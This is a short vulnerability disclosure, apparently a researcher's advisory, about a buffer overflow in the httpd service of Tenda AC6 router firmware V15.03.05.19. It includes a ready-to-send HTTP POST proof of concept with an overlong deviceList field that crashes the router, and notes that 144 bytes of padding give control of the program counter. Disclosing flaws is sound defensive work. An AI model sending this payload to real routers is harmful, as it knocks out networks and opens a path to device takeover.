# Tenda AC6V1.0 V15.03.05.19 formSetMacFilterCfg buffer overflow vulnerability

## Description

`Tenda`  Router **AC6V1.0 V15.03.05.19** was discovered to contain a buffer overflow in the `httpd` module when handling `/goform/formSetMacFilterCfg` request.

## Firmware information

* Manufacturer's address: https://www.tenda.com.cn/

* Firmware download address : https://www.tenda.com.cn/download/detail-2681.html

## Affected version

![](images/01.png)

## Vulnerability details

This vulnerability lies in the `/goform/formSetMacFilterCfg` page，The details are shown below:

![image-20221118102311680](images/02.png)

![image-20221118110536129](images/07.png)

![image-20221118105153664](images/05.png)

![image-20221118104935990](images/04.png)

Using A*144 to padding, we can control PC register

![image-20221118110047143](images/06.png)

## POC

This POC can result in a Dos.

```
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.204.133
Content-Length: 182
Accept: */*
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Origin: http://192.168.204.133
Referer: http://192.168.204.133/mac_filter.html?random=0.4768296248219275&
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: password=eeg1qw
Connection: close

macFilterType=black&deviceList=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB\r11
```

![image-20221118103155735](images/03.png)

